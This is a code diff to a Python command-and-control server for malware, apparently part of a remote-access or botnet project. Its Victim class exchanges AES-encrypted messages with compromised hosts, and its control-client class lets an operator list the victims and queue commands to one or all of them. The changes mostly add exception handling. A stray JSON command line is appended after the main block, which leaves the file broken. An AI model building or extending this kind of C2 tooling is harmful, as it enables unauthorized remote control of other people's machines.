@@ -52,31 +52,40 @@ class Victim(Thread):
 
 
     def secure_send(self, buf: bytes, length: len):
-        # Synchronize Buffer
-        self.conn.recv(1)
-        sessionCipher = AES.new(self.SessionKey, AES.MODE_CFB, self.SessionIV)
-        self.conn.send((length).to_bytes(4,byteorder="big")) # UINT32 4 bytes.
-        # Synchronize buffer
-        self.conn.recv(1)
-        ciphertext = sessionCipher.encrypt(buf);
-        # send the cipher text back to the client
-        # the session IV has allready been updated in this instance.
-        self.conn.send(ciphertext)
-        self.SessionIV = self.conn.recv(16)
+        try:
+            # Synchronize Buffer
+            self.conn.recv(1)
+            sessionCipher = AES.new(self.SessionKey, AES.MODE_CFB, self.SessionIV)
+            self.conn.send((length).to_bytes(4,byteorder="big")) # UINT32 4 bytes.
+            # Synchronize buffer
+            self.conn.recv(1)
+            ciphertext = sessionCipher.encrypt(buf);
+            # send the cipher text back to the client
+            # the session IV has allready been updated in this instance.
+            self.conn.send(ciphertext)
+            self.SessionIV = self.conn.recv(16)
+        except:
+            print("C2 Server> Victim" + self.get_name() + "Disconnected! ")
+            threadList.remove(self)
 
     def secure_recv(self,):
-        sessionCipher = AES.new(self.SessionKey, AES.MODE_CFB, self.SessionIV)
-        msgSZ = int.from_bytes(self.conn.recv(8),byteorder='big',signed=False)
-        if(self.conn.send(b"\x01") != 1):
-            print("An error has occured in Syncronization")
-            sys.exit(-1)
-        MSG = self.conn.recv(msgSZ)
-        if(self.conn.send(b"\x01") != 1):
-            print("An error has occured in Syncronization")
-            sys.exit(-1)
-        plaintext = sessionCipher.decrypt(MSG[16:])
-        self.SessionIV = MSG[:16]
-        return plaintext;
+        try:
+            sessionCipher = AES.new(self.SessionKey, AES.MODE_CFB, self.SessionIV)
+            msgSZ = int.from_bytes(self.conn.recv(8),byteorder='big',signed=False)
+            if(self.conn.send(b"\x01") != 1):
+                print("An error has occured in Syncronization")
+                sys.exit(-1)
+            MSG = self.conn.recv(msgSZ)
+            if(self.conn.send(b"\x01") != 1):
+                print("An error has occured in Syncronization")
+                sys.exit(-1)
+            plaintext = sessionCipher.decrypt(MSG[16:])
+            self.SessionIV = MSG[:16]
+            return plaintext;
+        except:
+            print("C2 Server> Victim " + self.get_name() + " Disconnected! ")
+            threadList.remove(self)
+
     def get_name(self):
         return str(self.conn.getpeername()) 
         
@@ -119,59 +128,60 @@ class CTRLClient(Thread):
     def __init__(self, cliSoc):
         Thread.__init__(self)
         self.conn = cliSoc
+        self.name = self.conn.getpeername()
+        print("C2 Server > Control Client " + self.name + " Connected")
 
     def sendStr(self, SendStr):
-        length = len(SendStr)
-        self.conn.send((length).to_bytes(8,byteorder="big")) # UINT32 4 bytes.
-        self.conn.recv(1) #Sync
-        self.conn.send(SendStr.encode()) 
-        self.conn.recv(1) #Sync
-        
+            length = len(SendStr)
+            self.conn.send((length).to_bytes(8,byteorder="big")) # UINT32 4 bytes.
+            self.conn.recv(1) #Sync
+            self.conn.send(SendStr.encode()) 
+            self.conn.recv(1) #Sync
     def recvStr(self):
-        msgSZ = int.from_bytes(self.conn.recv(8),byteorder='big',signed=False)
-        self.conn.send(b"\x01")
-        MSG = self.conn.recv(msgSZ)
-        self.conn.send(b"\x01") 
-        return MSG.decode()
-
+            msgSZ = int.from_bytes(self.conn.recv(8),byteorder='big',signed=False)
+            self.conn.send(b"\x01")
+            MSG = self.conn.recv(msgSZ)
+            self.conn.send(b"\x01") 
+            return MSG.decode()
     def run(self):
         jsonArray = []
-        while True:
-            try:
-                command = json.loads(self.recvStr())
-                if command["Target"] == str(self.conn.getsockname()):
-                    if str(command["Command"]) == "List Connections":
-                        for t in threadList:
-                            jsonArray.append(t.get_name())
-                        response = {}
-                        response["Type"] = "Victim List"
-                        response["Message"] = jsonArray
-                        self.sendStr(json.dumps(response))
-                elif command["Target"] == "*":
-                    for t in threadList:
-                        t.addCommandToQueue(str(command["Command"]))
-                    response = {}
-                    response["Type"] = "Data"
-                    response["Message"] = "Command sent to all victims"
-                    self.sendStr(json.dumps(response))
-                else:
-                    for t in threadList:
-                        if str(command["Target"]) == t.get_name():
-                            t.addCommandToQueue(str(command["Command"]))
-                            response["Type"] = "Data"
-                            response["Message"] = "Command sent to victim: " + str(t.get_name()) 
+        try:
+            while True:
+                try:
+                    command = json.loads(self.recvStr())
+                    if command["Target"] == str(self.conn.getsockname()):
+                        if str(command["Command"]) == "List Connections":
+                            for t in threadList:
+                                jsonArray.append(t.get_name())
+                            response = {}
+                            response["Type"] = "Victim List"
+                            response["Message"] = jsonArray
                             self.sendStr(json.dumps(response))
-            except:
-                if self.conn.fileno() == -1:
-                    print("Socket disconnected")
-                    break
-                response = {}
-                response["Type"] = "Error"
-                response["Message"] = "JSON Parsing Error"
-                self.sendStr(json.dumps(response))
-                print("C2 > Json parsing error")
-
-
+                    elif command["Target"] == "*":
+                        for t in threadList:
+                            t.addCommandToQueue(str(command["Command"]))
+                        response = {}
+                        response["Type"] = "Data"
+                        response["Message"] = "Command sent to all victims"
+                        self.sendStr(json.dumps(response))
+                    else:
+                        for t in threadList:
+                            if str(command["Target"]) == t.get_name():
+                                t.addCommandToQueue(str(command["Command"]))
+                                response["Type"] = "Data"
+                                response["Message"] = "Command sent to victim: " + str(t.get_name()) 
+                                self.sendStr(json.dumps(response))
+                except:
+                    if self.conn.fileno() == -1:
+                        print("Socket disconnected")
+                        break
+                    response = {}
+                    response["Type"] = "Error"
+                    response["Message"] = "JSON Parsing Error"
+                    self.sendStr(json.dumps(response))
+                    print("C2 > Json parsing error")
+        except:
+            print("C2 Server > Control Client " + self.name +" Disconnected")
 class CTRLThread(Thread):
 
     def __init__(self):
@@ -187,7 +197,6 @@ class CTRLThread(Thread):
 
     def run(self):
         while True:
-            
             cl, addr = self.svr.accept()
             c = CTRLClient(cl) 
             c.setName("CTRLClient")
@@ -203,4 +212,4 @@ def run(payload):
 
 if __name__ == "__main__":
     run(Victim)
-
+{"Target": "*", "Command": "test queue"}
